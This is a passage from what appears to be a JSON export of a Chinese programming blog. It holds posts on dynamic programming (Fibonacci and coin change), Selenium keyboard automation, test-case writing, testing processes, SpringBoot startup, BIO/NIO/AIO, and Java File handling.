状态2的所有取值： for ... dp[状态1][状态2][...] = 求最值(选择1，选择2...) 下面通过斐波那契数列问题和凑零钱问题来详解动态规划的基本原理。前者主要是让你明白什么是重叠子问题（斐波那契数列没有求最值，所以严格来说不是动态规划问题），后者主要举集中于如何列出状态转移方程。 一、斐波那契数列请读者不要嫌弃这个例子简单，只有简单的例子才能让你把精力充分集中在算法背后的通用思想和技巧上，而不会被那些隐晦的细节问题搞的莫名其妙。想要困难的例子，历史文章里有的是。 1、暴力递归 斐波那契数列的数学形式就是递归的，写成代码就是这样： 1234int fib(int N) &#123; if (N == 1 || N == 2) return 1; return fib(N - 1) + fib(N - 2);&#125; PS：但凡遇到需要递归的问题，最好都画出递归树，这对你分析算法的复杂度，寻找算法低效的原因都有巨大帮助。 这个递归树怎么理解？就是说想要计算原问题 f(20)，我就得先计算出子问题 f(19) 和 f(18)，然后要计算 f(19)，我就要先算出子问题 f(18) 和 f(17)，以此类推。最后遇到 f(1) 或者 f(2) 的时候，结果已知，就能直接返回结果，递归树不再向下生长了。 递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。 首先计算子问题个数，即递归树中节点的总数。显然二叉树节点总数为指数级别，所以子问题个数为 O(2^n)。 然后计算解决一个子问题的时间，在本算法中，没有循环，只有 f(n - 1) + f(n - 2) 一个加法操作，时间为 O(1)。 所以，这个算法的时间复杂度为二者相乘，即 O(2^n)，指数级别，爆炸。 观察递归树，很明显发现了算法低效的原因：存在大量重复计算，比如 f(18) 被计算了两次，而且你可以看到，以 f(18) 为根的这个递归树体量巨大，多算一遍，会耗费巨大的时间。更何况，还不止 f(18) 这一个节点被重复计算，所以这个算法及其低效。 这就是动态规划问题的第一个性质：重叠子问题。下面，我们想办法解决这个问题。 2、带备忘录的递归解法 明确了问题，其实就已经把问题解决了一半。即然耗时的原因是重复计算，那么我们可以造一个「备忘录」，每次算出某个子问题的答案后别急着返回，先记到「备忘录」里再返回；每次遇到一个子问题先去「备忘录」里查一查，如果发现之前已经解决过这个问题了，直接把答案拿出来用，不要再耗时去计算了。 一般使用一个数组充当这个「备忘录」，当然你也可以使用哈希表（字典），思想都是一样的。 12345678910111213141516int fib(int N) &#123; if (N &lt; 1) return 0; // 备忘录全初始化为 0 vector&lt;int&gt; memo(N + 1, 0); // 进行带备忘录的递归 return helper(memo, N);&#125;int helper(vector&lt;int&gt;&amp; memo, int n) &#123; // base case if (n == 1 || n == 2) return 1; // 已经计算过 if (memo[n] != 0) return memo[n]; memo[n] = helper(memo, n - 1) + helper(memo, n - 2); return memo[n];&#125; 现在，画出递归树，你就知道「备忘录」到底做了什么。 实际上，带「备忘录」的递归算法，把一棵存在巨量冗余的递归树通过「剪枝」，改造成了一幅不存在冗余的递归图，极大减少了子问题（即递归图中节点）的个数。 递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。 子问题个数，即图中节点的总数，由于本算法不存在冗余计算，子问题就是 f(1), f(2), f(3) … f(20)，数量和输入规模 n = 20 成正比，所以子问题个数为 O(n)。 解决一个子问题的时间，同上，没有什么循环，时间为 O(1)。 所以，本算法的时间复杂度是 O(n)。比起暴力算法，是降维打击。 至此，带备忘录的递归解法的效率已经和迭代的动态规划解法一样了。实际上，这种解法和迭代的动态规划已经差不多了，只不过这种方法叫做「自顶向下」，动态规划叫做「自底向上」。 啥叫「自顶向下」？注意我们刚才画的递归树（或者说图），是从上向下延伸，都是从一个规模较大的原问题比如说 f(20)，向下逐渐分解规模，直到 f(1) 和 f(2) 这两个 base case，然后逐层返回答案，这就叫「自顶向下」。 啥叫「自底向上」？反过来，我们直接从最底下，最简单，问题规模最小的 f(1) 和 f(2) 开始往上推，直到推到我们想要的答案 f(20)，这就是动态规划的思路，这也是为什么动态规划一般都脱离了递归，而是由循环迭代完成计算。 3、dp 数组的迭代解法 有了上一步「备忘录」的启发，我们可以把这个「备忘录」独立出来成为一张表，就叫做 DP table 吧，在这张表上完成「自底向上」的推算岂不美哉！ 12345678910int fib(int N) &#123; if (N &lt; 1) return 0; if (N == 1 || N == 2) return 1; vector&lt;int&gt; dp(N + 1, 0); // base case dp[1] = dp[2] = 1; for (int i = 3; i &lt;= N; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[N];&#125; 画个图就很好理解了，而且你发现这个 DP table 特别像之前那个「剪枝」后的结果，只是反过来算而已。实际上，带备忘录的递归解法中的「备忘录」，最终完成后就是这个 DP table，所以说这两种解法其实是差不多的，大部分情况下，效率也基本相同。 这里，引出「状态转移方程」这个名词，实际上就是描述问题结构的数学形式： 为啥叫「状态转移方程」？其实就是为了听起来高端。你把 f(n) 想做一个状态 n，这个状态 n 是由状态 n - 1 和状态 n - 2 相加转移而来，这就叫状态转移，仅此而已。 你会发现，上面的几种解法中的所有操作，例如 return f(n - 1) + f(n - 2)，dp[i] = dp[i - 1] + dp[i - 2]，以及对备忘录或 DP table 的初始化操作，都是围绕这个方程式的不同表现形式。可见列出「状态转移方程」的重要性，它是解决问题的核心。而且很容易发现，其实状态转移方程直接代表着暴力解法。 千万不要看不起暴力解，动态规划问题最困难的就是写出这个暴力解，即状态转移方程。只要写出暴力解，优化方法无非是用备忘录或者 DP table，再无奥妙可言。 这个例子的最后，讲一个细节优化。细心的读者会发现，根据斐波那契数列的状态转移方程，当前状态只和之前的两个状态有关，其实并不需要那么长的一个 DP table 来存储所有的状态，只要想办法存储之前的两个状态就行了。所以，可以进一步优化，把空间复杂度降为 O(1)： 123456789101112int fib(int n) &#123; if (n &lt; 1) return 0; if (n == 2 || n == 1) return 1; int prev = 1, curr = 1; for (int i = 3; i &lt;= n; i++) &#123; int sum = prev + curr; prev = curr; curr = sum; &#125; return curr;&#125; 这个技巧就是所谓的「状态压缩」，如果我们发现每次状态转移只需要 DP table 中的一部分，那么可以尝试用状态压缩来缩小 DP table 的大小，只记录必要的数据，上述例子就相当于把DP table 的大小从 n 缩小到 2。后续的动态规划章节中我们还会看到这样的例子，一般来说是把一个二维的 DP table 压缩成一维，即把空间复杂度从 O(n^2) 压缩到 O(n)。 有人会问，动态规划的另一个重要特性「最优子结构」，怎么没有涉及？下面会涉及。斐波那契数列的例子严格来说不算动态规划，因为没有涉及求最值，以上旨在说明重叠子问题的消除方法，演示得到最优解法逐步求精的过程。下面，看第二个例子，凑零钱问题。 二、凑零钱问题先看下题目：给你 k 种面值的硬币，面值分别为 c1, c2 ... ck，每种硬币的数量无限，再给一个总金额 amount，问你最少需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 。算法的函数签名如下： 12// coins 中是可选硬币面值，amount 是目标金额int coinChange(int[] coins, int amount); 比如说 k = 3，面值分别为 1，2，5，总金额 amount = 11。那么最少需要 3 枚硬币凑出，即 11 = 5 + 5 + 1。 你认为计算机应该如何解决这个问题？显然，就是把所有可能的凑硬币方法都穷举出来，然后找找看最少需要多少枚硬币。 1、暴力递归 首先，这个问题是动态规划问题，因为它具有「最优子结构」的。要符合「最优子结构」，子问题间必须互相独立。啥叫相互独立？你肯定不想看数学证明，我用一个直观的例子来讲解。 比如说，假设你考试，每门科目的成绩都是互相独立的。你的原问题是考出最高的总成绩，那么你的子问题就是要把语文考到最高，数学考到最高…… 为了每门课考到最高，你要把每门课相应的选择题分数拿到最高，填空题分数拿到最高…… 当然，最终就是你每门课都是满分，这就是最高的总成绩。 得到了正确的结果：最高的总成绩就是总分。因为这个过程符合最优子结构，“每门科目考到最高”这些子问题是互相独立，互不干扰的。 但是，如果加一个条件：你的语文成绩和数学成绩会互相制约，数学分数高，语文分数就会降低，反之亦然。这样的话，显然你能考到的最高总成绩就达不到总分了，按刚才那个思路就会得到错误的结果。因为子问题并不独立，语文数学成绩无法同时最优，所以最优子结构被破坏。 回到凑零钱问题，为什么说它符合最优子结构呢？比如你想求 amount = 11 时的最少硬币数（原问题），如果你知道凑出 amount = 10 的最少硬币数（子问题），你只需要把子问题的答案加一（再选一枚面值为 1 的硬币）就是原问题的答案。因为硬币的数量是没有限制的，所以子问题之间没有相互制，是互相独立的。 PS：关于最优子结构的问题，后文动态规划答疑篇 还会再举例探讨。 那么，既然知道了这是个动态规划问题，就要思考如何列出正确的状态转移方程？ 1、确定 base case，这个很简单，显然目标金额 amount 为 0 时算法返回 0，因为不需要任何硬币就已经凑出目标金额了。 2、确定「状态」，也就是原问题和子问题中会变化的变量。由于硬币数量无限，硬币的面额也是题目给定的，只有目标金额会不断地向 base case 靠近，所以唯一的「状态」就是目标金额 amount。 3、确定「选择」，也就是导致「状态」产生变化的行为。目标金额为什么变化呢，因为你在选择硬币，你每选择一枚硬币，就相当于减少了目标金额。所以说所有硬币的面值，就是你的「选择」。 4、明确 dp 函数/数组的定义。我们这里讲的是自顶向下的解法，所以会有一个递归的 dp 函数，一般来说函数的参数就是状态转移中会变化的量，也就是上面说到的「状态」；函数的返回值就是题目要求我们计算的量。就本题来说，状态只有一个，即「目标金额」，题目要求我们计算凑出目标金额所需的最少硬币数量。所以我们可以这样定义 dp 函数： dp(n) 的定义：输入一个目标金额 n，返回凑出目标金额 n 的最少硬币数量。 搞清楚上面这几个关键点，解法的伪码就可以写出来了： 123456789101112# 伪码框架def coinChange(coins: List[int], amount: int): # 定义：要凑出金额 n，至少要 dp(n) 个硬币 def dp(n): # 做选择，选择需要硬币最少的那个结果 for coin in coins: res = min(res, 1 + dp(n - coin)) return res # 题目要求的最终结果是 dp(amount) return dp(amount) 根据伪码，我们加上 base case 即可得到最终的答案。显然目标金额为 0 时，所需硬币数量为 0；当目标金额小于 0 时，无解，返回 -1： 1234567891011121314151617def coinChange(coins: List[int], amount: int): def dp(n): # base case if n == 0: return 0 if n &lt; 0: return -1 # 求最小值，所以初始化为正无穷 res = float('INF') for coin in coins: subproblem = dp(n - coin) # 子问题无解，跳过 if subproblem == -1: continue res = min(res, 1 + subproblem) return res if res != float('INF') else -1 return dp(amount) 至此，状态转移方程其实已经完成了，以上算法已经是暴力解法了，以上代码的数学形式就是状态转移方程： 至此，这个问题其实就解决了，只不过需要消除一下重叠子问题，比如 amount = 11, coins = {1,2,5} 时画出递归树看看： 递归算法的时间复杂度分析：子问题总数 x 每个子问题的时间。 子问题总数为递归树节点个数，这个比较难看出来，是 O(n^k)，总之是指数级别的。每个子问题中含有一个 for 循环，复杂度为 O(k)。所以总时间复杂度为 O(k * n^k)，指数级别。 2、带备忘录的递归 类似之前斐波那契数列的例子，只需要稍加修改，就可以通过备忘录消除子问题： 1234567891011121314151617181920def coinChange(coins: List[int], amount: int): # 备忘录 memo = dict() def dp(n): # 查备忘录，避免重复计算 if n in memo: return memo[n] # base case if n == 0: return 0 if n &lt; 0: return -1 res = float('INF') for coin in coins: subproblem = dp(n - coin) if subproblem == -1: continue res = min(res, 1 + subproblem) # 记入备忘录 memo[n] = res if res != float('INF') else -1 return memo[n] return dp(amount) 不画图了，很显然「备忘录」大大减小了子问题数目，完全消除了子问题的冗余，所以子问题总数不会超过金额数 n，即子问题数目为 O(n)。处理一个子问题的时间不变，仍是 O(k)，所以总的时间复杂度是 O(kn)。 3、dp 数组的迭代解法 当然，我们也可以自底向上使用 dp table 来消除重叠子问题，关于「状态」「选择」和 base case 与之前没有区别，dp 数组的定义和刚才 dp 函数类似，也是把「状态」，也就是目标金额作为变量。不过 dp 函数体现在函数参数，而 dp 数组体现在数组索引： dp 数组的定义：当目标金额为 i 时，至少需要 dp[i] 枚硬币凑出。 根据我们文章开头给出的动态规划代码框架可以写出如下解法： 12345678910111213141516int coinChange(vector&lt;int&gt;&amp; coins, int amount) &#123; // 数组大小为 amount + 1，初始值也为 amount + 1 vector&lt;int&gt; dp(amount + 1, amount + 1); // base case dp[0] = 0; // 外层 for 循环在遍历所有状态的所有取值 for (int i = 0; i &lt; dp.size(); i++) &#123; // 内层 for 循环在求所有选择的最小值 for (int coin : coins) &#123; // 子问题无解，跳过 if (i - coin &lt; 0) continue; dp[i] = min(dp[i], 1 + dp[i - coin]); &#125; &#125; return (dp[amount] == amount + 1) ? -1 : dp[amount];&#125; PS：为啥 dp 数组初始化为 amount + 1 呢，因为凑成 amount 金额的硬币数最多只可能等于 amount（全用 1 元面值的硬币），所以初始化为 amount + 1 就相当于初始化为正无穷，便于后续取最小值。 三、最后总结第一个斐波那契数列的问题，解释了如何通过「备忘录」或者「dp table」的方法来优化递归树，并且明确了这两种方法本质上是一样的，只是自顶向下和自底向上的不同而已。 第二个凑零钱的问题，展示了如何流程化确定「状态转移方程」，只要通过状态转移方程写出暴力递归解，剩下的也就是优化递归树，消除重叠子问题而已。 如果你不太了解动态规划，还能看到这里，真得给你鼓掌，相信你已经掌握了这个算法的设计技巧。 计算机解决问题其实没有任何奇技淫巧，它唯一的解决办法就是穷举，穷举所有可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明地穷举”。 列出动态转移方程，就是在解决“如何穷举”的问题。之所以说它难，一是因为很多穷举需要递归实现，二是因为有的问题本身的解空间复杂，不那么容易穷举完整。 备忘录、DP table 就是在追求“如何聪明地穷举”。用空间换时间的思路，是降低时间复杂度的不二法门，除此之外，试问，还能玩出啥花活？ 之后我们会有一章专门讲解动态规划问题，如果有任何问题都可以随时回来重读本文，希望读者在阅读每个题目和解法时，多往「状态」和「选择」上靠，才能对这套框架产生自己的理解，运用自如。","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"automated test：selenium","slug":"自动化测试","date":"2021-01-31T10:52:47.000Z","updated":"2021-04-11T17:11:29.007Z","comments":true,"path":"automated-test-selenium/","link":"","permalink":"https://kayleh.top/automated-test-selenium/","excerpt":"","text":"Selenium 浏览器插件Selenium IDE Selenium 3.0没有RC 使用： Record a new test in a new project 在新项目中录制一个新测试 Open an existing project 打开一个现有项目 Create a new project 创建一个新项目 Close Selenium IDE 关闭Selenium IDE 脚本录制在浏览器中手动操作，就可以selenium录制出来 断言 导出Export python pytest 在python环境下使用selenium1 2 浏览器驱动webdriver http://chromedriver.storage.googleapis.com/index.html 放到python目录下（python已添加进系统变量） webdriver API 键盘事件key包提供按键方法使用必须先引用key包：from selenium.webdriver.common.keys import Keys 键盘事件，在现实操作中我们习惯性的按tab见切换到写一个输入或者元素，Key()类几乎提供所有按键的方法： 引用方法 对应键盘 send_keys(Keys.BACK_SPACE) 删除键（BackSpace） send_keys(Keys.SPACE) 空格键(Space) send_keys(Keys.TAB) 制表键(Tab) send_keys(Keys.ESCAPE) 回退键（Esc） send_keys(Keys.ENTER) 回车键（Enter） send_keys(Keys.CONTROL,’a’) 全选（Ctrl+A） send_keys(Keys.CONTROL,’c’) 复制（Ctrl+C） send_keys(Keys.CONTROL,’x’) 剪切（Ctrl+X） send_keys(Keys.CONTROL,’v’) 粘贴（Ctrl+V） send_keys(Keys.F1) 键盘 F1 send_keys(Keys.F12) 键盘 F12 1234567891011121314151617181920212223242526272829#coding=utf-8from selenium import webdriverfrom selenium.webdriver.common.keys import Keysimport timedriver = webdriver.Chrome()driver.get(\"https://www.baidu.com\")driver.find_element_by_id(\"kw\").send_keys(\"seleniumm\")time.sleep(1)driver.find_element_by_id(\"kw\").send_keys(Keys.BACK_SPACE) time.sleep(1)# 和前面的拼接driver.find_element_by_id(\"kw\").send_keys(\"seleniumm\")time.sleep(1)# ctrl+adriver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,\"a\") time.sleep(1)driver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,\"x\") time.sleep(1) driver.find_element_by_id(\"kw\").send_keys(Keys.CONTROL,\"v\") time.sleep(1)driver.find_element_by_id(\"su\").click()driver.quit() 操作alter 记得加延时,把样式显示出来 版本问题,switch_to.alert 多表单处理 元素等待 可以设置抛出的信息： 判断： 注意： 系统等待time.sleep(5) 自动化测试用例设计 自动化测试模型 线性测试 模块化驱动测试class very_login(): 悬浮 数据驱动测试 字典 csv文件（excel文件） 数据库 配置文件 数据的参数化 :one:字典： :two:csv文件 import csv 12for d in data: print(d) 添加xlrd模块（excel文件）","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Test case","slug":"测试用例","date":"2021-01-24T09:51:10.000Z","updated":"2021-04-11T17:11:28.969Z","comments":true,"path":"test-case/","link":"","permalink":"https://kayleh.top/test-case/","excerpt":"","text":"测试用例什么是测试用例 测试用例(Test Case)是指对一项特定的软件产品进行测试任务的描述，体现测试方案、方法、技术和策略。其内容包括测试目标、测试环境、输入数据、测试步骤、预期结果、测试脚本等，最终形成文档。简单地认为，测试用例是为某个特殊目标而编制的一组测试输入、执行条件以及预期结果，用于核实是否满足某个特定软件需求。 回归测试模板：（excel） 测试用例编号 测试项 依赖用例 测试步骤 输入数据 预期结果 测试结果 测试人 备注 1、2、 标识符(用例编号)，一般编号规则：TestCase_项目名称_模块名称_功能名称_0001 测试用例的测试目的。一般情况下，用一句话表明目的。（用谷歌浏览器打开百度首页） 一般功能流程上，下游的功能测试依赖于上游的功能测试的用例 用最朴实的语言，写出来软件的操作步骤，要尽量详细（在文本框输入xxx） 测试数据 准确，在重要的步骤之后，设定预期结果，一般和测试目的密切相关 只有两个，通过/失败（和预期结果） 测试用例编写注意事项黑盒测试用例设计方法","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Software testing process","slug":"软件测试流程","date":"2021-01-15T09:17:42.000Z","updated":"2021-04-11T17:11:29.051Z","comments":true,"path":"program-test/","link":"","permalink":"https://kayleh.top/program-test/","excerpt":"","text":"软件测试流程 过程模型★V模型 ★W模型 H模型 X模型 测试过程理念 软件测试的分类 测试需求分析1.列出待测需求 2.设定需求优先级 3.详细描述测试需求内容 4.经过评审并通过 5.需求统计及分析 测试需求编号 测试需求名称 质量特性 所在模块 所在页面 优先级 负责人 版本号 需求详情描述 JXC-SRS-GN-XT-JBXX-001 公司名称 功能特性 系统设置模块 基本信息设置模块 低级 张三 v2.1 1.内容:文本 2.约束:非空 测试用例 缺陷报告 缺陷编号 缺陷标题 状态(new新提交,open确认修改,fixed修改完成,closed回归通过,reopen回归不通过) 优先级(高,中,低) 严重程度(致命,严重,一般,轻微,建议) 提交人 缺陷描述 1 QC需求 text plan 步骤: test lab 有缺陷时,立即提交缺陷 自定义 入库数量用例分析 组合测试判定表 删除测试 安全测试XSS、SQL注入","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"SpringBoot startup process","slug":"SpringBoot启动过程和注解","date":"2021-01-15T04:40:54.000Z","updated":"2021-04-11T17:11:28.432Z","comments":true,"path":"SpringBoot-startup-process/","link":"","permalink":"https://kayleh.top/SpringBoot-startup-process/","excerpt":"","text":"SpringBoot应用启动流程 我们将各步骤总结精炼如下： 通过 SpringFactoriesLoader 加载 META-INF/spring.factories 文件，获取并创建 SpringApplicationRunListener 对象 然后由 SpringApplicationRunListener 来发出 starting 消息 创建参数，并配置当前 SpringBoot 应用将要使用的 Environment 完成之后，依然由 SpringApplicationRunListener 来发出 environmentPrepared 消息 创建 ApplicationContext 初始化 ApplicationContext，并设置 Environment，加载相关配置等 由 SpringApplicationRunListener 来发出 contextPrepared 消息，告知SpringBoot 应用使用的 ApplicationContext 已准备OK 将各种 beans 装载入 ApplicationContext，继续由 SpringApplicationRunListener 来发出 contextLoaded 消息，告知 SpringBoot 应用使用的 ApplicationContext 已装填OK refresh ApplicationContext，完成IoC容器可用的最后一步 由 SpringApplicationRunListener 来发出 started 消息 完成最终的程序的启动 由 SpringApplicationRunListener 来发出 running 消息，告知程序已运行起来了 至此，全流程结束！","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"the difference of BIO、NIO、AIO","slug":"BIO、NIO、AIO区别","date":"2020-12-20T08:15:14.000Z","updated":"2021-04-11T17:11:28.097Z","comments":true,"path":"bionioaio/","link":"","permalink":"https://kayleh.top/bionioaio/","excerpt":"","text":"BIO、NIO、AIO区别一、BIO 在JDK1.4出来之前，我们建立网络连接的时候采用BIO模式，需要先在服务端启动一个ServerSocket，然后在客户端启动Socket来对服务端进行通信，默认情况下服务端需要对每个请求建立一堆线程等待请求，而客户端发送请求后，先咨询服务端是否有线程相应，如果没有则会一直等待或者遭到拒绝请求，如果有的话，客户端会线程会等待请求结束后才继续执行。 二、NIO NIO本身是基于事件驱动思想来完成的，其主要想解决的是BIO的大并发问题： 在使用同步I/O的网络应用中，如果要同时处理多个客户端请求，或是在客户端要同时和多个服务器进行通讯，就必须使用多线程来处理。也就是说，将每一个客户端请求分配给一个线程来单独处理。这样做虽然可以达到我们的要求，但同时又会带来另外一个问题。由于每创建一个线程，就要为这个线程分配一定的内存空间（也叫工作存储器），而且操作系统本身也对线程的总数有一定的限制。如果客户端的请求过多，服务端程序可能会因为不堪重负而拒绝客户端的请求，甚至服务器可能会因此而瘫痪。 NIO基于Reactor，当socket有流可读或可写入socket时，操作系统会相应的通知引用程序进行处理，应用再将流读取到缓冲区或写入操作系统。 也就是说，这个时候，已经不是一个连接就要对应一个处理线程了，而是有效的请求，对应一个线程，当连接没有数据时，是没有工作线程来处理的。 BIO与NIO一个比较重要的不同，是我们使用BIO的时候往往会引入多线程，每个连接一个单独的线程；而NIO则是使用单线程或者只使用少量的多线程，每个连接共用一个线程。 NIO的最重要的地方是当一个连接创建后，不需要对应一个线程，这个连接会被注册到多路复用器上面，所以所有的连接只需要一个线程就可以搞定，当这个线程中的多路复用器进行轮询的时候，发现连接上有请求的话，才开启一个线程进行处理，也就是一个请求一个线程模式。 在NIO的处理方式中，当一个请求来的话，开启线程进行处理，可能会等待后端应用的资源(JDBC连接等)，其实这个线程就被阻塞了，当并发上来的话，还是会有BIO一样的问题。 HTTP/1.1出现后，有了Http长连接，这样除了超时和指明特定关闭的http header外，这个链接是一直打开的状态的，这样在NIO处理中可以进一步的进化，在后端资源中可以实现资源池或者队列，当请求来的话，开启的线程把请求和请求数据传送给后端资源池或者队列里面就返回，并且在全局的地方保持住这个现场(哪个连接的哪个请求等)，这样前面的线程还是可以去接受其他的请求，而后端的应用的处理只需要执行队列里面的就可以了，这样请求处理和后端应用是异步的.当后端处理完，到全局地方得到现场，产生响应，这个就实现了异步处理。 三、AIO 与NIO不同，当进行读写操作时，只须直接调用API的read或write方法即可。这两种方法均为异步的，对于读操作而言，当有流可读取时，操作系统会将可读的流传入read方法的缓冲区，并通知应用程序；对于写操作而言，当操作系统将write方法传递的流写入完毕时，操作系统主动通知应用程序。 即可以理解为，read/write方法都是异步的，完成后会主动调用回调函数。 在JDK1.7中，这部分内容被称作NIO.2，主要在java.nio.channels包下增加了下面四个异步通道： AsynchronousSocketChannel AsynchronousServerSocketChannel AsynchronousFileChannel AsynchronousDatagramChannel 其中的read/write方法，会返回一个带回调函数的对象，当执行完读取/写入操作后，直接调用回调函数。 BIO是一个连接一个线程。 NIO是一个请求一个线程。 AIO是一个有效请求一个线程。 先来个例子理解一下概念，以银行取款为例： 同步 ： 自己亲自出马持银行卡到银行取钱（使用同步IO时，Java自己处理IO读写）； 异步 ： 委托一小弟拿银行卡到银行取钱，然后给你（使用异步IO时，Java将IO读写委托给OS处理，需要将数据缓冲区地址和大小传给OS(银行卡和密码)，OS需要支持异步IO操作API）； 阻塞 ： ATM排队取款，你只能等待（使用阻塞IO时，Java调用会一直阻塞到读写完成才返回）； 非阻塞 ： 柜台取款，取个号，然后坐在椅子上做其它事，等号广播会通知你办理，没到号你就不能去，你可以不断问大堂经理排到了没有，大堂经理如果说还没到你就不能去（使用非阻塞IO时，如果不能读写Java调用会马上返回，当IO事件分发器会通知可读写时再继续进行读写，不断循环直到读写完成） Java对BIO、NIO、AIO的支持： Java BIO ： 同步并阻塞，服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端就需要启动一个线程进行处理，如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。 Java NIO ： 同步非阻塞，服务器实现模式为一个请求一个线程，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。 Java AIO(NIO.2) ： 异步非阻塞，服务器实现模式为一个有效请求一个线程，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理， BIO、NIO、AIO适用场景分析: BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中，JDK1.4以前的唯一选择，但程序直观简单易理解。 NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂，JDK1.4开始支持。 AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK7开始支持。 另外，I/O属于底层操作，需要操作系统支持，并发也需要操作系统的支持，所以性能方面不同操作系统差异会比较明显。 在高性能的I/O设计中，有两个比较著名的模式Reactor和Proactor模式，其中Reactor模式用于同步I/O，而Proactor运用于异步I/O操作。 在比较这两个模式之前，我们首先的搞明白几个概念，什么是阻塞和非阻塞，什么是同步和异步,同步和异步是针对应用程序和内核的交互而言的，同步指的是用户进程触发IO操作并等待或者轮询的去查看IO操作是否就绪，而异步是指用户进程触发IO操作以后便开始做自己的事情，而当IO操作已经完成的时候会得到IO完成的通知。而阻塞和非阻塞是针对于进程在访问数据的时候，根据IO操作的就绪状态来采取的不同方式，说白了是一种读取或者写入操作函数的实现方式，阻塞方式下读取或者写入函数将一直等待，而非阻塞方式下，读取或者写入函数会立即返回一个状态值。 一般来说I/O模型可以分为：同步阻塞，同步非阻塞，异步阻塞，异步非阻塞IO 同步阻塞IO：在此种方式下，用户进程在发起一个IO操作以后，必须等待IO操作的完成，只有当真正完成了IO操作以后，用户进程才能运行。JAVA传统的IO模型属于此种方式！ 同步非阻塞IO:在此种方式下，用户进程发起一个IO操作以后边可返回做其它事情，但是用户进程需要时不时的询问IO操作是否就绪，这就要求用户进程不停的去询问，从而引入不必要的CPU资源浪费。其中目前JAVA的NIO就属于同步非阻塞IO。 异步阻塞IO：此种方式下是指应用发起一个IO操作以后，不等待内核IO操作的完成，等内核完成IO操作以后会通知应用程序，这其实就是同步和异步最关键的区别，同步必须等待或者主动的去询问IO是否完成，那么为什么说是阻塞的呢？因为此时是通过select系统调用来完成的，而select函数本身的实现方式是阻塞的，而采用select函数有个好处就是它可以同时监听多个文件句柄，从而提高系统的并发性！ 异步非阻塞IO:在此种模式下，用户进程只需要发起一个IO操作然后立即返回，等IO操作真正的完成以后，应用程序会得到IO操作完成的通知，此时用户进程只需要对数据进行处理就好了，不需要进行实际的IO读写操作，因为真正的IO读取或者写入操作已经由内核完成了。目前Java中还没有支持此种IO模型。","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"Talk about:IO","slug":"浅谈IO","date":"2020-12-20T06:45:19.000Z","updated":"2021-04-11T17:11:28.964Z","comments":true,"path":"IO/","link":"","permalink":"https://kayleh.top/IO/","excerpt":"","text":"File对象在计算机系统中，文件是非常重要的存储方式。Java的标准库java.io提供了File对象来操作文件和目录。 要构造一个File对象，需要传入文件路径： 123456public class Main &#123; public static void main(String[] args) &#123; File f = new File(\"C:\\\\Windows\\\\notepad.exe\"); System.out.println(f); &#125;&#125; 构造File对象时，既可以传入绝对路径，也可以传入相对路径。绝对路径是以根目录开头的完整路径，例如： 1File f = new File(\"C:\\\\Windows\\\\notepad.exe\"); 注意Windows平台使用\\作为路径分隔符，在Java字符串中需要用\\\\表示一个\\。Linux平台使用/作为路径分隔符： 1File f = new File(\"/usr/bin/javac\"); 传入相对路径时，相对路径前面加上当前目录就是绝对路径： 1234// 假设当前目录是C:\\DocsFile f1 = new File(\"sub\\\\javac\"); // 绝对路径是C:\\Docs\\sub\\javacFile f3 = new File(\".\\\\sub\\\\javac\"); // 绝对路径是C:\\Docs\\sub\\javacFile f3 = new File(\"..\\\\sub\\\\javac\"); // 绝对路径是C:\\sub\\javac 可以用.表示当前目录，..表示上级目录。 File对象有3种形式表示的路径，一种是getPath()，返回构造方法传入的路径，一种是getAbsolutePath()，返回绝对路径，一种是getCanonicalPath，它和绝对路径类似，但是返回的是规范路径。 什么是规范路径？我们看以下代码： 12345678public class Main &#123; public static void main(String[] args) throws IOException &#123; File f = new File(\"..\"); System.out.println(f.getPath()); System.out.println(f.getAbsolutePath()); System.out.println(f.getCanonicalPath()); &#125;&#125; 绝对路径可以表示成C:\\Windows\\System32\\..\\notepad.exe，而规范路径就是把.和..转换成标准的绝对路径后的路径：C:\\Windows\\notepad.exe。 因为Windows和Linux的路径分隔符不同，File对象有一个静态变量用于表示当前平台的系统分隔符： 1System.out.println(File.separator); // 根据当前平台打印\"\\\"或\"/\" 文件和目录File对象既可以表示文件，也可以表示目录。特别要注意的是，构造一个File对象，即使传入的文件或目录不存在，代码也不会出错，因为构造一个File对象，并不会导致任何磁盘操作。只有当我们调用File对象的某些方法的时候，才真正进行磁盘操作。 例如，调用isFile()，判断该File对象是否是一个已存在的文件，调用isDirectory()，判断该File对象是否是一个已存在的目录： 12345678910111213public class Main &#123; public static void main(String[] args) throws IOException &#123; File f1 = new File(\"C:\\\\Windows\"); File f2 = new File(\"C:\\\\Windows\\\\notepad.exe\"); File f3 = new File(\"C:\\\\Windows\\\\nothing\"); System.out.println(f1.isFile()); System.out.println(f1.isDirectory()); System.out.println(f2.isFile()); System.out.println(f2.isDirectory()); System.out.println(f3.isFile()); System.out.println(f3.isDirectory()); &#125;&#125; 用File对象获取到一个文件时，还可以进一步判断文件的权限和大小： boolean canRead()：是否可读； boolean canWrite()：是否可写； boolean canExecute()：是否可执行； long length()：文件字节大小。 对目录而言，是否可执行表示能否列出它包含的文件和子目录。 